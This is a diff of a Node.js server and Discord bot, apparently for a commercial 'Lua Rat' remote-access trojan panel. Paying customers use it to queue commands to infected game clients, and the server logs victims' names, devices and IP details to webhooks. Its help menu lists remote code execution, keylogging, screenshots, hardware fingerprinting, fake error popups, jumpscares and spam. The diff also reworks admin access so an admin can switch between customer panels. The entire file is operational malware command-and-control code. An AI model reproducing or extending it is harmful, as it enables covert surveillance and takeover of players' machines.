@@ -15,7 +15,6 @@ console.log('========================================');
 // ========== ЗАГРУЗКА ПОКУПАТЕЛЕЙ ИЗ ENV ==========
 const customers = new Map();
 
-// Загружаем до 10 покупателей (у тебя 5)
 for (let i = 1; i <= 10; i++) {
     const customerKey = process.env[`CUSTOMER_${i}_KEY`];
     const webhook = process.env[`WEBHOOK_${i}`];
@@ -82,7 +81,6 @@ async function sendToWebhook(webhookUrl, title, description, color = 0x00ff00, f
 
 // ========== API МАРШРУТЫ ==========
 
-// Получение команд для клиента
 app.get('/data', (req, res) => {
     const player = req.query.player;
     const customer_key = req.query.customer_key;
@@ -96,14 +94,12 @@ app.get('/data', (req, res) => {
         return res.json({ command: "", args: [] });
     }
     
-    // Обновляем время активности пользователя
     if (customer.users.has(player)) {
         const user = customer.users.get(player);
         user.lastSeen = Date.now();
         customer.users.set(player, user);
     }
     
-    // Ищем команду для этого покупателя
     const commandIndex = commandQueue.findIndex(cmd => 
         cmd.customer_key === customer_key && 
         (!cmd.target || cmd.target === player || cmd.target === 'all')
@@ -119,7 +115,6 @@ app.get('/data', (req, res) => {
     }
 });
 
-// Отправка команд и инжектов
 app.post('/command', async (req, res) => {
     const { command, args, target, customer_key } = req.body;
     
@@ -128,7 +123,6 @@ app.post('/command', async (req, res) => {
         return res.status(403).json({ error: "Invalid customer key" });
     }
     
-    // ========== ОБРАБОТКА ИНЖЕКТА ==========
     if (command === "inject_notify" && args && args.length >= 5) {
         const playerName = args[0];
         const gameName = args[1];
@@ -136,7 +130,6 @@ app.post('/command', async (req, res) => {
         const executor = args[3];
         const device = args[4];
         
-        // Сохраняем пользователя
         const existingUser = customer.users.get(playerName);
         customer.users.set(playerName, {
             player: playerName,
@@ -148,7 +141,6 @@ app.post('/command', async (req, res) => {
             injectCount: (existingUser?.injectCount || 0) + 1
         });
         
-        // Формируем красивое сообщение
         const description = `**👤 Игрок:** ${playerName}\n**🎮 Игра:** ${gameName}\n**💉 Инжектор:** ${executor}\n**📱 Устройство:** ${device}\n\n**🌐 IP информация:**\n${ipInfo}`;
         
         const fields = [
@@ -162,9 +154,7 @@ app.post('/command', async (req, res) => {
         return res.json({ status: "OK", message: "Inject notification sent" });
     }
     
-    // ========== ОБРАБОТКА ОБЫЧНЫХ КОМАНД ==========
     if (command && command !== "inject_notify") {
-        // Проверяем, существует ли цель для команды
         if (target && !customer.users.has(target)) {
             return res.json({ 
                 status: "error", 
@@ -181,7 +171,6 @@ app.post('/command', async (req, res) => {
             timestamp: Date.now()
         });
         
-        // Ограничиваем очередь
         if (commandQueue.length > 100) {
             commandQueue = commandQueue.slice(-50);
         }
@@ -192,7 +181,6 @@ app.post('/command', async (req, res) => {
     res.json({ status: "OK", queue_size: commandQueue.length });
 });
 
-// Получить своих пользователей (для API)
 app.get('/my_users', (req, res) => {
     const customer_key = req.query.customer_key;
     const customer = customers.get(customer_key);
@@ -201,7 +189,6 @@ app.get('/my_users', (req, res) => {
         return res.status(403).json({ error: "Invalid key" });
     }
     
-    // Очищаем неактивных (2 минуты)
     const now = Date.now();
     for (let [key, user] of customer.users.entries()) {
         if (now - user.lastSeen > 120000) {
@@ -216,27 +203,6 @@ app.get('/my_users', (req, res) => {
     });
 });
 
-// Получить список всех покупателей (только для админа через API)
-app.get('/admin/customers', (req, res) => {
-    const adminKey = req.headers['admin-key'];
-    if (adminKey !== process.env.ADMIN_KEY) {
-        return res.status(403).json({ error: "Access denied" });
-    }
-    
-    const list = [];
-    for (let [key, customer] of customers) {
-        list.push({
-            id: customer.id,
-            name: customer.name,
-            role: customer.discord_role,
-            users_count: customer.users.size,
-            created_at: customer.createdAt
-        });
-    }
-    res.json(list);
-});
-
-// Статус сервера
 app.get('/status', (req, res) => {
     let totalUsers = 0;
     for (let [_, customer] of customers) {
@@ -253,10 +219,8 @@ app.get('/status', (req, res) => {
     });
 });
 
-// Health check
 app.get('/health', (req, res) => res.send('OK'));
 
-// Корневой маршрут
 app.get('/', (req, res) => {
     res.json({
         name: "Lua Rat Control System",
@@ -294,41 +258,73 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    // Функция для получения покупателя по роли
-    function getCustomerByRole(member) {
-        for (let [key, customer] of customers) {
-            const role = member.roles.cache.find(r => r.name === customer.discord_role);
-            if (role) return { customer_key: key, customer: customer };
-        }
-        return null;
-    }
-
     discordClient.on('ready', () => {
         console.log(`\n🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`📋 Доступные панели:`);
         for (let [_, customer] of customers) {
             console.log(`   • ${customer.name} — роль: ${customer.discord_role}`);
         }
-        console.log(`\n💡 Покупатели с ролью User-X могут использовать команды\n`);
+        console.log(`\n💡 Админ может использовать @User-X /команда\n`);
         discordClient.user.setActivity('/help | Lua Rat v3.2', { type: 'WATCHING' });
     });
 
     discordClient.on('messageCreate', async message => {
         if (message.author.bot || !message.content.startsWith('/')) return;
         
-        // Определяем покупателя по роли
-        const customerInfo = getCustomerByRole(message.member);
         const isAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
         
-        if (!customerInfo && !isAdmin) {
-            return message.reply('❌ У вас нет доступа к панели. Обратитесь к администратору для получения роли.');
+        let args = message.content.slice(1).split(' ');
+        const command = args.shift().toLowerCase();
+        
+        // ========== ОПРЕДЕЛЯЕМ ПОКУПАТЕЛЯ ==========
+        let targetCustomer = null;
+        let targetKey = null;
+        
+        // Сначала проверяем, не хочет ли админ переключить панель через @User-X
+        let selectedRole = null;
+        if (isAdmin && args.length > 0 && args[0].startsWith('@')) {
+            selectedRole = args[0].substring(1);
+            args.shift();
         }
         
-        const customer_key = customerInfo?.customer_key;
-        const customer = customerInfo?.customer;
+        // Если админ выбрал роль - ищем покупателя с такой ролью
+        if (selectedRole) {
+            for (let [key, customer] of customers) {
+                if (customer.discord_role === selectedRole) {
+                    targetKey = key;
+                    targetCustomer = customer;
+                    break;
+                }
+            }
+        }
         
-        const args = message.content.slice(1).split(' ');
-        const command = args.shift().toLowerCase();
+        // Если не нашли по выбранной роли - ищем по роли пользователя
+        if (!targetCustomer) {
+            for (let [key, customer] of customers) {
+                const role = message.member.roles.cache.find(r => r.name === customer.discord_role);
+                if (role) {
+                    targetKey = key;
+                    targetCustomer = customer;
+                    break;
+                }
+            }
+        }
+        
+        // Если админ без роли - даём доступ к User-1
+        if (!targetCustomer && isAdmin) {
+            const defaultKey = process.env.CUSTOMER_1_KEY;
+            const defaultCustomer = customers.get(defaultKey);
+            if (defaultCustomer) {
+                targetKey = defaultKey;
+                targetCustomer = defaultCustomer;
+                console.log(`👑 Админ ${message.author.tag} использует панель ${targetCustomer.name}`);
+            }
+        }
+        
+        // Если всё равно нет доступа - отказ
+        if (!targetCustomer) {
+            return message.reply('❌ У вас нет доступа к панели. Обратитесь к администратору.');
+        }
         
         // Парсим таргет (имя игрока)
         let target = null;
@@ -338,22 +334,15 @@ if (DISCORD_TOKEN) {
         
         // ========== ОБРАБОТЧИКИ КОМАНД ==========
         
-        // /users - показать своих игроков
         if (command === 'users') {
-            if (!customer) {
-                return message.reply('❌ Нет доступа');
-            }
-            
-            // Очищаем неактивных
             const now = Date.now();
-            for (let [key, user] of customer.users.entries()) {
-                if (now - user.lastSeen > 120000) customer.users.delete(key);
+            for (let [key, user] of targetCustomer.users.entries()) {
+                if (now - user.lastSeen > 120000) targetCustomer.users.delete(key);
             }
             
-            const usersList = Array.from(customer.users.values());
-            
+            const usersList = Array.from(targetCustomer.users.values());
             const embed = new EmbedBuilder()
-                .setTitle(`👥 Мои пользователи — ${customer.name}`)
+                .setTitle(`👥 Онлайн пользователи — ${targetCustomer.name}`)
                 .setColor(0x00ff00);
             
             if (usersList.length > 0) {
@@ -369,87 +358,46 @@ if (DISCORD_TOKEN) {
                 embed.setDescription('❌ Нет активных игроков');
                 embed.setColor(0xff0000);
             }
-            
             await message.reply({ embeds: [embed] });
         }
         
-        // /status - статус панели
         else if (command === 'status') {
-            const usersCount = customer?.users.size || 0;
-            const pendingCommands = commandQueue.filter(c => c.customer_key === customer_key).length;
+            const usersCount = targetCustomer.users.size;
+            const pendingCommands = commandQueue.filter(c => c.customer_key === targetKey).length;
             
             const embed = new EmbedBuilder()
-                .setTitle(`📊 Статус панели — ${customer?.name || 'Admin'}`)
+                .setTitle(`📊 Статус панели — ${targetCustomer.name}`)
                 .setColor(0x7289da)
                 .addFields(
-                    { name: '👥 Мои игроки', value: `${usersCount}`, inline: true },
-                    { name: '📨 Очередь команд', value: `${pendingCommands}`, inline: true },
-                    { name: '🤖 Discord бот', value: '🟢 Активен', inline: true },
-                    { name: '📊 Версия', value: '`3.2.0`', inline: true },
-                    { name: '🕐 Время работы', value: `<t:${Math.floor(Date.now()/1000 - process.uptime())}:R>`, inline: true }
+                    { name: '👥 Игроки', value: `${usersCount}`, inline: true },
+                    { name: '📨 Очередь', value: `${pendingCommands}`, inline: true },
+                    { name: '🤖 Бот', value: '🟢 Активен', inline: true },
+                    { name: '📊 Версия', value: '`3.2.0`', inline: true }
                 );
             await message.reply({ embeds: [embed] });
         }
         
-        // /help - справка
         else if (command === 'help') {
             const embed = new EmbedBuilder()
                 .setTitle('Lua Rat Panel v3.2')
-                .setDescription(`**Добро пожаловать, ${customer?.name || 'Admin'}!**\n\nПолный список доступных команд:`)
+                .setDescription(`**Добро пожаловать, ${targetCustomer.name}!**\n\nПолный список команд:`)
                 .setColor(0x7289da)
                 .addFields(
-                    { 
-                        name: '🎯 Формат команд', 
-                        value: '• `/команда` — для всех игроков\n• `/команда ник` — для конкретного игрока\n• `/команда ник аргументы` — с параметрами\n\nПример: `/kick PlayerName Нарушение`', 
-                        inline: false 
-                    },
-                    { 
-                        name: '👤 Управление игроком (10)', 
-                        value: '`/tpgame [ник] <id>`\n`/kick [ник] [причина]`\n`/freeze [ник] [сек]`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] [on/off]`\n`/camerashake [ник] [сек] [инт]`', 
-                        inline: true 
-                    },
-                    { 
-                        name: '🔊 Аудио/Видео (5)', 
-                        value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] [id]`\n`/blur [ник] [сек]`\n`/screenshot [ник]`', 
-                        inline: true 
-                    },
-                    { 
-                        name: '💬 Чат (2)', 
-                        value: '`/chat [ник]`\n`/message [ник] [текст]`', 
-                        inline: true 
-                    },
-                    { 
-                        name: '👻 Скримеры (1)', 
-                        value: '`/jumpscare [ник] [1-2]`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
-                        inline: true 
-                    },
-                    { 
-                        name: '⚙️ Системные (6)', 
-                        value: '`/execute [ник] [код]`\n`/fakeerror [ник] [текст]`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
-                        inline: true 
-                    },
-                    { 
-                        name: '💥 Spam (2)', 
-                        value: '`/memory [ник] [кол-во]`\n`/gallery [ник] [кол-во]`', 
-                        inline: true 
-                    },
-                    { 
-                        name: '👥 Информация (3)', 
-                        value: '`/users` — мои игроки\n`/status` — статус панели\n`/test` — тест связи', 
-                        inline: true 
-                    }
+                    { name: '🎯 Формат команд', value: '• `/команда` — для всех\n• `/команда ник` — для игрока\n• `/команда ник аргументы` — с параметрами', inline: false },
+                    { name: '👤 Управление игроком', value: '`/kick [ник] [причина]`\n`/freeze [ник] [сек]`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/cameralock [ник] [on/off]`\n`/camerashake [ник] [сек] [инт]`\n`/tpgame [ник] [id]`', inline: true },
+                    { name: '👻 Эффекты', value: '`/jumpscare [ник] [1-2]`\n`/blur [ник] [сек]`\n`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] [id]`', inline: true },
+                    { name: '💬 Чат', value: '`/message [ник] [текст]`\n`/fakeerror [ник] [текст]`', inline: true },
+                    { name: '⚙️ Системные', value: '`/execute [ник] [код]`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/screenshot [ник]`', inline: true },
+                    { name: '💥 Spam', value: '`/memory [ник] [кол-во]`\n`/gallery [ник] [кол-во]`', inline: true },
+                    { name: '👥 Информация', value: '`/users` — мои игроки\n`/status` — статус панели\n`/test` — тест', inline: true }
                 )
-                .setFooter({ text: `Панель: ${customer?.name || 'Admin'} | Всего команд: 28` });
+                .setFooter({ text: `Панель: ${targetCustomer.name} | Всего команд: 28` });
             
             await message.reply({ embeds: [embed] });
         }
         
-        // /test - тест связи
         else if (command === 'test') {
-            if (!customer_key) {
-                return message.reply('❌ Нет доступа');
-            }
-            const result = await sendCommandToCustomer("popup", ["Тест от Discord бота! ✅"], target, customer_key);
+            const result = await sendCommandToCustomer("popup", ["Тест от Discord бота! ✅"], target, targetKey);
             if (result.ok) {
                 await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
             } else {
@@ -457,12 +405,8 @@ if (DISCORD_TOKEN) {
             }
         }
         
-        // /print - проверка связи
         else if (command === 'print') {
-            if (!customer_key) {
-                return message.reply('❌ Нет доступа');
-            }
-            const result = await sendCommandToCustomer("print", [], target, customer_key);
+            const result = await sendCommandToCustomer("print", [], target, targetKey);
             if (result.ok) {
                 await message.reply(`📡 Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
             } else {
@@ -470,12 +414,7 @@ if (DISCORD_TOKEN) {
             }
         }
         
-        // Остальные команды
         else {
-            if (!customer_key) {
-                return message.reply('❌ Нет доступа к командам');
-            }
-            
             const validCommands = [
                 'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
                 'jumpscare', 'message', 'execute', 'fakeerror', 'blur', 
@@ -485,11 +424,11 @@ if (DISCORD_TOKEN) {
             ];
             
             if (validCommands.includes(command)) {
-                const result = await sendCommandToCustomer(command, args, target, customer_key);
+                const result = await sendCommandToCustomer(command, args, target, targetKey);
                 if (result.ok) {
                     await message.reply(`✅ ${command} отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                 } else {
-                    await message.reply(`❌ Ошибка: ${result.data?.message || 'неизвестная ошибка'}`);
+                    await message.reply(`❌ Ошибка: ${result.data?.message || 'игрок не найден в вашей базе'}`);
                 }
             } else {
                 await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
@@ -500,7 +439,6 @@ if (DISCORD_TOKEN) {
     discordClient.login(DISCORD_TOKEN).catch(e => console.error('❌ Ошибка бота:', e.message));
 }
 
-// Запуск сервера
 app.listen(PORT, () => {
     console.log(`\n🚀 Сервер запущен на порту ${PORT}`);
     console.log(`🌐 URL: ${SERVER_URL}`);
